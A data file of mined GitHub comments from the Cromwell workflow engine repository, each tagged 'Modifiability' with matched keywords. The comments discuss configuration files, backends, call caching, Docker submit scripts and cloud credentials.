Modifiability,"Hi. Call caching is turned off by default, did you turn it on in your configuration? Also call caching will require the use of a MySQL-like database to preserve caching information between runs. Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3740#issuecomment-395410031:70,config,configuration,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3740#issuecomment-395410031,1,['config'],['configuration']
Modifiability,Highly related to the [summarizer and worker Cromwell](https://github.com/broadinstitute/cromwell/issues/4781) issue and probably a better place to start since this is our existing configuration.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4780#issuecomment-478984741:181,config,configuration,181,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4780#issuecomment-478984741,1,['config'],['configuration']
Modifiability,"Hi！; I am glad to see this issue, and I have also tried using PBS as the backend to run it. But I'm not very good at it.; Can you show me how the configuration file for cromwell is defined when using PBS as the backend?; Thank you.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4967#issuecomment-2105600521:146,config,configuration,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4967#issuecomment-2105600521,2,['config'],['configuration']
Modifiability,"Hm, why was that config added back in? Those fields aren't used anymore, are they?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1680785022:17,config,config,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7178#issuecomment-1680785022,1,['config'],['config']
Modifiability,"Hm. This looks like a conf bug on our side, but [is your config file importing application.conf](https://cromwell.readthedocs.io/en/stable/tutorials/ConfigurationFiles/#creating-your-first-configuration-file)? That file contains other overrides that cromwell should have over the default `akka` configuration. The bug here is that application.conf is only supposed to contain overrides, while reference.conf should contain newly defined resources. Since the `services` block are cromwell's services, they should be newly defined in reference.conf. That would then allow anyone who accidentally doesn't pick up our application.conf to *at least* have the reference `services`, plus the original `akka` values with degraded cromwell performance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4577#issuecomment-457755274:57,config,config,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4577#issuecomment-457755274,4,"['Config', 'config']","['ConfigurationFiles', 'config', 'configuration', 'configuration-file']"
Modifiability,"Hmm you're right, I had simplified the workflow too much to reproduce the blocking but going back to your workflow I still can get it stuck with the local variable.; Looking into it now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358657812:155,variab,variable,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358657812,1,['variab'],['variable']
Modifiability,"Hmm, I would try in a vanilla browser with no plugins",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4625#issuecomment-465194780:46,plugin,plugins,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4625#issuecomment-465194780,1,['plugin'],['plugins']
Modifiability,"Hmm, this seems a bit odd. The `application_default` authentication should still work with a service account, as long as you set the `$GOOGLE_APPLICATION_CREDENTIALS` variable is set, which @juhawilppu seems to have done here. I had this same issue, where my service account only worked once I used a `scheme = ""service_account""`, but that seems like something is implemented wrongly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-432526506:167,variab,variable,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-432526506,1,['variab'],['variable']
Modifiability,"Hmm... is this a security flaw? Should people even be allowed to do this (or is this configurable?). Current thinking... it might be ok because if you are running a cromwell with a local docker engine you may very well want to do this. If you are running cromwell with local docker, and allowing someone to run jobs on your server, they could gain access to any file anyway via their jobs. . Thoughts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-217951965:85,config,configurable,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/802#issuecomment-217951965,1,['config'],['configurable']
Modifiability,Hmm… Liquibase isn't thread safe. https://liquibase.jira.com/browse/CORE-2792. The various tests creating temporary databases may need refactoring.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-436756869:135,refactor,refactoring,135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-436756869,1,['refactor'],['refactoring']
Modifiability,How are you building with a sandbox without sudo?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463863078:28,sandbox,sandbox,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463863078,1,['sandbox'],['sandbox']
Modifiability,How do you use this support? Working example? ; Config wise,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-585446149:48,Config,Config,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-585446149,1,['Config'],['Config']
Modifiability,"However the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/), right in the section describing the configuration file for PAPIv1, neither states this simple fact about Requester Pays not working with PAPIv1 nor links to the useful [page](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays) you mentioned. I have now switched to the [PAPIv2.conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/PAPIv2.conf) configuration file which does not contain the important piece of configuration code:; ```; engine {; filesystems {; gcs {; auth = ""application-default""; project = ""<google-billing-project-id>""; }; }; }; ```; This was in the google.conf PAPIv1 configuration file. I guess somehow it did not make it in the PAPIv2 configuration file and users reading the tutorial have the guess that on their own. Now the Requester Pays issue is gone as I get lines like this in the logs instead:; ```; 2020/07/28 21:30:48 rm -f $HOME/.config/gcloud/gce && gsutil -h ""Content-Type: text/plain; charset=UTF-8"" cp /google/logs/output gs://xxx/Mutect2/74c8be5e-f988-49b0-a51d-c87f2ac7cb60/call-TumorCramToBam/TumorCramToBam.log failed; BadRequestException: 400 Bucket is requester pays bucket but no user project provided.; 2020/07/28 21:30:48 Retrying with user project; Copying file:///google/logs/output [Content-Type=text/plain; charset=UTF-8]...; ```; At least that's fully clarified. However I still get the error:; ```; 2020/07/28 21:30:43 Localizing input gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram -> /cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram; Error attempting to localize file with command: 'mkdir -p '/cromwell_root/fc-118",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665298885:130,config,configuration,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665298885,5,['config'],['configuration']
Modifiability,"I added a test to `WdlFileToWomSpec`. However, I don't know how to set the configuration flag `wom-parse.convert-nested-scatter-to-subworkflow` inside of it. I can do it manually, and it works.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5061#issuecomment-511051253:75,config,configuration,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5061#issuecomment-511051253,1,['config'],['configuration']
Modifiability,"I added the `concurrent-job-limit` to the `reference.conf` and I will add it to the [Configuration draft on the WDL website](http://gatkforums.broadinstitute.org/dsde/discussion/8687/how-to-configure-cromwell), tracked in [DSDE-docs #1524](https://github.com/broadinstitute/dsde-docs/issues/1524).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1841#issuecomment-276804191:85,Config,Configuration,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1841#issuecomment-276804191,2,"['Config', 'config']","['Configuration', 'configure-cromwell']"
Modifiability,"I agree with Lee here. I think we could do much better at getting people rolling rather than pointing them at a mega-file inside of our source tree. For example -- slimming down what a user needs to have in their conf file, and also providing template conf files for common configurations (SGE, JES, Local, etc). This issue needs more refinement before being ready for development",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1590#issuecomment-255497178:274,config,configurations,274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1590#issuecomment-255497178,1,['config'],['configurations']
Modifiability,"I also played around with bolting on the docker hashing too. To be clear, I like @mcovarr's PR here better, as it's much cleaner, and has tests! Still, here's some overlapping [code](https://github.com/broadinstitute/cromwell/compare/job_avoidance...ks_hash_docker_image) to look at, especially the first commit with an alternative way to get an `ActorSystem` down into the `BackendCall`. A few issues left though, but some/most of these can be logged as new tickets, and we can get basic wiring in for the moment via this PR. Biggest issue-- 10 seconds is right on the edge for testing _and_ checking the docker server for the hash, so different docker tests currently timeout intermittently. Among other issues I saw, `Future` exception handling may be different due to refactoring. For example converting `Future { /* big block */ }` to `/* big block */ hashFuture.map(hash => ...)` allows exceptions within the block to not get caught (as expected?). Also I wasn't sure yet how we want to handle some `Failure` cases, specifically when the docker server doesn't return a hash. I assume that means that we should just run again from scratch, and NOT go to a `FailedExecution` state in the database. Or maybe we should go to `Failure`, and just retry a particular operations later. With ~~Gatling~~ Tyburn load testing, perhaps we can log any docker client errors now, and start to distinguish them with custom error handling code as they pop up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702:772,refactor,refactoring,772,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702,1,['refactor'],['refactoring']
Modifiability,"I also tried Firefox Quantum 65.0.1, with all extensions disabled. (Also tried with the latest Shockwave Flash, just in case.) Same result. I also tried IE9 with basically no plug-ins, and I cannot even login there. The ""Sign In"" button does nothing. Are you sure that my account gives me access to ask questions?. Any other ideas?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4625#issuecomment-465215552:175,plug-in,plug-ins,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4625#issuecomment-465215552,1,['plug-in'],['plug-ins']
Modifiability,"I also wouldn't be sparse with the variables, for some future user coming to read this, I would use `--exclusive` instead of `-x` and then `--unlock` instead of `-u` so it's explicitly clear.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509638449:35,variab,variables,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509638449,1,['variab'],['variables']
Modifiability,"I am pretty sure at least the `~/.aws/credentials` file is picked up by some amazon library, otherwise no AWS calls would work. Typically AWS libraries pick up the `~/.aws/config` file too. Here's how you find out what the region is in python, no idea how to do it in Scala. ```python; import boto3; session = boto3.session.Session(); print(session.region_name); ```; This ends up matching what's in `~/.aws/config`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493270266:172,config,config,172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493270266,2,['config'],['config']
Modifiability,I am running into an issue whereby this feature would be helpful. I am developing workflows using CWL but one of the command line tools being used in CWL requires the runtime attribute 'bootDiskSizeGb' to be set to 100 instead of 10 for this particular task. As CWL doesn't have an equivalent attribute the only way I can set this is in the 'default-runtime-attributes' section of my configuration file but now all tasks for the workflow will use 100GB for their boot disk size instead of the single task that actually requires it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-511067941:384,config,configuration,384,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-511067941,1,['config'],['configuration']
Modifiability,"I am trying to use this. I switch to the ""aws_backend"" branch, checked it out, figured out how to build it, and now I have run into:. [2018-06-04 06:34:20,69] [error] java.lang.IllegalArgumentException: s3://atbiofx-cromwell/cromwell-execution exists on a filesystem not supported by this instance of Cromwell. Supported filesystems are: MacOSXFileSystem. Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; cromwell.core.path.PathParsingException: java.lang.IllegalArgumentException: s3://atbiofx-cromwell/cromwell-execution exists on a filesystem not supported by this instance of Cromwell. Supported filesystems are: MacOSXFileSystem. Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3427#issuecomment-394509732:421,config,configure,421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3427#issuecomment-394509732,2,['config'],['configure']
Modifiability,"I am using exactly the wdl and json offered by gatk GitHub page for gatk4-germline-snps-indels, locally, I got this error, intervals-hg38.even.handcurated.20k.intervals is larger than 128000 Bytes. Maximum read limits can be adjusted in the configuration under system.input-read-limits.; I tried to change it via type this in command line: java -Dsystem.input-read-limits=500000 -jar /cromwell-34.jar ; Didn't work.; Who can tell me how to fix it?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2768#issuecomment-413173960:241,config,configuration,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2768#issuecomment-413173960,1,['config'],['configuration']
Modifiability,"I am using this code and trying various configurations to write workflow logs, but I find myself confused a lot... Currently the README has [three environment variables](https://github.com/broadinstitute/cromwell/blob/ks_copy_logs/README.md#logging) listed (`LOG_ROOT`, `LOG_MODE`, `LOG_LEVEL`). It appears that `logback.xml` expects `LOG_MODE` to be `pretty` or `standard` but `WorkflowDescriptor` is expecting it to be `server`. I also couldn't figure out how to both output logs to stdout and also write to a workflow log (a feature I'd be particularly interested in!). Also it appears that we only honor `LOG_ROOT` when `LOG_MODE` is `server`. Can we maybe have a tech talk whenever you get a chance to understand how all these options play together?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/468#issuecomment-188390329:40,config,configurations,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/468#issuecomment-188390329,2,"['config', 'variab']","['configurations', 'variables']"
Modifiability,"I believe that in Life Sciences and its predecessors, pull access to private GCR images was granted by the credentials on the job VM. Since Batch is a much larger step change, it could be that this behavior no longer holds true. @Lipastomies what steps do you take to configure your system to use those private images?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2130262417:268,config,configure,268,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2130262417,1,['config'],['configure']
Modifiability,I believe the config backend system in Cromwell 0.21+ now allows for everything that's asked for here.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/375#issuecomment-253879748:14,config,config,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/375#issuecomment-253879748,1,['config'],['config']
Modifiability,I came here to say what I apparently said a few months ago already :). We don't have access to a SLURM cluster so anything we put together would be a guess on our part. I know folks have been able to pretty easily get LSF & PBS working based on our example of an SGE configuration so my assumption is that it's not hard but I have no way of knowing. If someone were to get it working and submit docs we'd happily accept them but we have no way of handling that ourselves.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-281771190:267,config,configuration,267,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-281771190,1,['config'],['configuration']
Modifiability,"I came out with a custom and dirty way of going around this issue. In my configuration file, I changed the `backend.providers.Local.config.submit-docker` script for the following:. ```bash; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc; ```. Maybe this could be the default value in the [reference configuration file](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf) to solve the problem, but maybe it is better to have a `post-docker` configuration which is added to the pipeline similar to the `script-epilogue`. This would make easier the configuration of docker runs, separating submission and checks. By now, I will use the following local configuration to continue my work with the cromwell runner:. ```; include required(classpath(""application"")). ## keep always the workflow logs; workflow-options.workflow-log-temporary: false. backend.providers.Local.config {; ## limit the number of jobs; concurrent-job-limit = 15; # set the root directory to the run; filesystems.local {; ## do not allow copy (huge files); localization: [""hard-link"", ""soft-link""]; caching.duplication-strategy: [""hard-link"", ""soft-link""]; }; # custom submit-docker to workaround detached container due to timeout in the virtual machine; # first, we do not remove the container until it really finishes (no --rm flag); # if the docker run command fails, then it runs docker wait to wait until it finishes and store the return code; # if the docker run command fails, then it runs docker wait to return the real exit code even if detached; # once it finishes, removes the docker containe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526:73,config,configuration,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526,6,['config'],"['config', 'configuration']"
Modifiability,"I can understand. This solution is not ideal. On the upside: it is only activated for those who willingly put ""cached-copy"" in their configs. The rest of the cromwell users are **not** affected by the lock mechanism. By default this does **not** affect anyone. I could adapt this PR and plaster the words: `WARNING: EXPERIMENTAL` all over it if that helps. EDIT: While I mention it ""is not ideal"", the only situation where the locks might not be effective is when using multiple cromwell processes, that do use the same execution folder. Does this happen often in practice? Is this even a supported use case?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-498211225:133,config,configs,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-498211225,2,"['adapt', 'config']","['adapt', 'configs']"
Modifiability,I chose ficus since its `as` API returns `A`s rather than config's `configs.Result[A]`s which would have been a lot more disruptive. I didn't look at other alternatives.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1554#issuecomment-252418216:58,config,config,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1554#issuecomment-252418216,2,['config'],"['config', 'configs']"
Modifiability,"I compiled and tested this, and it works correctly. As I'm not familiar with java/scala, I cant provide a full review unfortunately. I did notice some warnings when starting cromwell, but as everything works, maybe that's not a problem ? . 2021-03-13 12:17:25,630 WARN - Unrecognized configuration key(s) for AwsBatch: auth, numCreateDefinitionAttempts, default-runtime-attributes.awsBatchRetryAttempts, awsBatchRetryAttempts, filesystems.s3.duplication-strategy, numSubmitAttempts, default-runtime-attributes.scriptBucketName. Thanks by the way ! This was exactly what we were waiting for",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-799139288:284,config,configuration,284,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-799139288,1,['config'],['configuration']
Modifiability,"I concur with your TODO on DRYing up the Akka configs, but still :+1:. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/902/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/902#issuecomment-222160086:46,config,configs,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/902#issuecomment-222160086,1,['config'],['configs']
Modifiability,"I did a configuration using a local MySQL server without docker. I guess that the problem was that my docker machine does not connect the `localhost` address from the VM to the host machine. Thus, the `localhost` port was not providing the connection to the MySQL server. This might be a common problem in MacOS computers, which are running `boot2docker`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-373318603:8,config,configuration,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-373318603,1,['config'],['configuration']
Modifiability,"I did not know of this thread.; At our institute we have solved this differently. We use `singularity exec` and no specific pull command. This will try to locate the image in the cache whis is located in `SINGULARITY_CACHEDIR` (env variable). If it is already there it will use it. If not, it will download it. This will lead to race condition if it is used in a scatter. We use https://github.com/biowdl/prepull-singularity to pull the images beforehand, so no race conditions occur. I am also thinking of adding a `docker_pull` thing to the config, so you can do `singularity exec {image} echo done!` or something similar to make sure the cache is populated at workflow initialization time. I have no ETA on this though, for now the prepull singularity script works.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627146756:232,variab,variable,232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627146756,2,"['config', 'variab']","['config', 'variable']"
Modifiability,"I did some further debugging and I found that cromwell creates a SlickDatabase object twice. Once for the database and once for the metadata. That is probably were the conflict comes from. Using the following configuration the metadata database is kept separate and the problem could not be reproduced anymore. I am now trying it on a production workflow on our cluster. ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell-metadata.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; }. ```. I am currently looking in how to make the metadata and engine use the same connection when they are using the same configuration. EDIT: The code hierarchy concerning both the engine database and metadata database is quite complex, it is not straightforward to share a connection. Using a separate metadatabase seems to be a faster workaround for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734858027:209,config,configuration,209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734858027,2,['config'],['configuration']
Modifiability,"I did that and began encountering the following error:; ```; 2019-02-25 18:17:52,693 cromwell-system-akka.actor.default-dispatcher-29 ERROR - No configuration setting found for key 'services'; akka.actor.ActorInitializationException: akka://cromwell-system/user/cromwell-service/ServiceRegistryActor: exception during creation; 	at akka.actor.ActorInitializationException$.apply(Actor.scala:193); 	at akka.actor.ActorCell.create(ActorCell.scala:669); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorF",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:145,config,configuration,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['configuration']
Modifiability,"I didn't know but you're right _JAVA_OPTIONS is not documented anywhere :s; Although it is supported in Java8 http://hg.openjdk.java.net/jdk8/jdk8/hotspot/file/87ee5ee27509/src/share/vm/runtime/arguments.cpp#l2448. For temporary files ; ""The default temporary-file directory is specified by the system property java.io.tmpdir. On UNIX systems the default value of this property is typically ""/tmp"" or ""/var/tmp""; on Microsoft Windows systems it is typically ""C:\WINNT\TEMP""."" (https://docs.oracle.com/javase/8/docs/api/java/io/File.html); On linux `/tmp` is hardcoded as the tmp directory if `java.io.tmpdir` is not set:; http://hg.openjdk.java.net/jdk8/jdk8/hotspot/file/87ee5ee27509/src/os/linux/vm/os_linux.cpp#l1622; But yes this only solves the problem for Java. @scottfrazer said that python honors the TMPDIR environment variable.; I don't know if symlinking /tmp to cromwell_root is better overall, because then anything running on the vm would write its temp files to cromwell directory. There should not be a lot of things running besides our docker but we have not control over it. Also nothing guarantees that other programs would actually write their temp files to /tmp. I feel like this would have to be a per case thing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/273#issuecomment-154203788:828,variab,variable,828,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/273#issuecomment-154203788,1,['variab'],['variable']
Modifiability,"I do have a region set in the config and when I was setting up the AMI, after`#4294 I'm using ap-southeast-2.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437350646:30,config,config,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437350646,1,['config'],['config']
Modifiability,"I don't believe WDL ever allowed workflow declarations to be visible in tasks, but I'll label this as an enhancement request for our PO to review.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2504#issuecomment-326060034:105,enhance,enhancement,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2504#issuecomment-326060034,1,['enhance'],['enhancement']
Modifiability,"I don't know about the actual difference. I also have to admit that there is another possible variable here which is that when we ran this originally the farm was free and clear so the jobs ran very quickly. Now the farm is quite busy which is slowing down the workflow, but this is not the fault of cromwell. . Maybe @yfarjoun would have a better sense of timing boost.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289041275:94,variab,variable,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289041275,1,['variab'],['variable']
Modifiability,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:1235,Enhance,EnhancedFailureResponseOrT,1235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690,2,['Enhance'],"['EnhancedFailureResponseOrT', 'EnhancedFutureHttpResponse']"
